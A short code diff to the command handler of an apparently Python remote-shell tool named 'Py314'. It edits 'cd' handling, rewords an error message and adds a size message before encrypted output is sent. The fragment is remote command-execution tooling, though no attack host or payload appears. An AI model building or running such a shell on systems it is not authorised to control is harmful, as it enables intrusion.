@@ -272,7 +272,7 @@ def serverHandler(channel, password):
     
 # ------------------------------- Py314 REQUEST PARSING -------------------------------
 
-            # If 'cd' command send
+             # If 'cd' command send
             if clientRequest.split(' ')[0] == 'cd':
                 workingDir = clientRequest.split(' ')[1]
                 logging.debug('Cd command send by Py314')
@@ -282,9 +282,10 @@ def serverHandler(channel, password):
                     # Return empty output, to not block the remote shell
                     output = ' '
                 else:
-                    output = f"{{workingDir}} doesn'nt exist"
+                    output = f"The remote folder {{workingDir}} doesn'nt exist"
 
                 encryptedOutput = encrypt_message(password, output)
+                sendSize(channel, password, len(encryptedOutput))
                 channel.sendall(encryptedOutput.encode())
 
             # If check alive
